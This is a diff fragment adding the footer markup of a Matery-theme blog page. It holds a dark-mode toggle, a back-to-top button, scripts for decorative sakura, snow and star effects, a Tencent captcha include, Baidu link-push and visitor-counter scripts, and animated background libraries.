+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
